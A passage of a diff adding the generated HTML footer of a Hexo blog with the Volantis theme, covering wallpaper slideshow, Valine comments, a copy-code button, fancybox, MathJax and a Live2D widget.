"https://gitee.com/wallpapers/minimalist/raw/master/2020/038.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/039.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/040.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/041.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/042.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/043.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/044.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/045.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/046.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/047.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/048.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/049.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/050.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/051.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/052.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/053.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/054.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/055.jpg", "https://gitee.com/wallpapers/minimalist/raw/master/2020/056.jpg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('') {
+          $('').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.js"></script>
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/meting@2.0/dist/Meting.min.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4/dist/Valine.min.js"></script>
+
+  
+  <script>
+  var GUEST_INFO = ['nick','mail','link'];
+  var meta = 'nick,mail,link'.split(',').filter(function(item){
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick','mail','link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function(item){
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+  var valine = new Valine();
+  function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+  }
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+  valine.init({
+    el: '#valine_container',
+    meta: meta,
+    
+    appId: "dogUA2FSKGTo029M1SEwGROT-MdYXbMMI",
+    appKey: "u0NdtQ8nvHoMdJPSYqm1LRxE",
+    placeholder: "快来评论吧~",
+    pageSize:'10',
+    avatar:'robohash',
+    lang:'zh-cn',
+    visitor: 'true',
+    highlight: 'true',
+    mathJax: 'true',
+    enableQQ: 'true',
+    requiredFields: requiredFields,
+    emojiCDN: 'https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/emoji/valine/',
+    emojiMaps: emojiMaps
+  })
+  </script>
+
+
+
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js"></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('fa-copy');
+        $icon.addClass('fa-check-circle');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('fa-check-circle');
+          $icon.addClass('fa-copy');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('fa-copy');
+        $icon.addClass('fa-times-circle');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('fa-times-circle');
+          $icon.addClass('fa-copy');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+
+
+<!-- fancybox -->
+
+  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  let LAZY_LOAD_IMAGE = "";
+  $(".article-entry").find("div.fancybox").find("img").each(function () {
+      var element = document.createElement("a");
+      $(element).attr("data-fancybox", "gallery");
+      $(element).attr("href", $(this).attr("src"));
+      /* 图片采用懒加载处理时,
+       * 一般图片标签内会有个属性名来存放图片的真实地址，比如 data-original,
+       * 那么此处将原本的属性名src替换为对应属性名data-original,
+       * 修改如下
+       */
+       if (LAZY_LOAD_IMAGE) {
+         $(element).attr("href", $(this).attr("data-original"));
+       }
+      $(this).wrap(element);
+  });
+</script>
+
+
+
+
+
+
+  <script>setLoadingBarProgress(100);</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script src="/node_modules/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"node_modules/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/node_modules/assets/miku.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
